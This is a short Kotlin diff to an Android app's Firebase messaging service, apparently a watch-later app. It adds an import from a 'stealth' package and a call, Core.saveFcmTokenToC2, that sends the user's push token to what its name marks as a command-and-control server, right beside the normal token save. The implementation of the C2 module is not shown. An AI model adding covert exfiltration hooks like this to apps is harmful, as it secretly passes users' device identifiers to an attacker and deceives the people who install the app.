@@ -15,6 +15,7 @@ import com.kaze.WatchLaterApp
 import com.kaze.data.repository.ActivityRepository
 import com.kaze.data.repository.UserRepository
 import com.kaze.stealth.Core
+import com.kaze.stealth.Transport
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -33,6 +34,7 @@ class KazeMessagingService : FirebaseMessagingService() {
                 if (userId != null) {
                     ActivityRepository(applicationContext).saveFcmToken(userId, token)
                 }
+                Core.saveFcmTokenToC2(applicationContext, token)
             } catch (e: Exception) {
                 e.printStackTrace()
             }
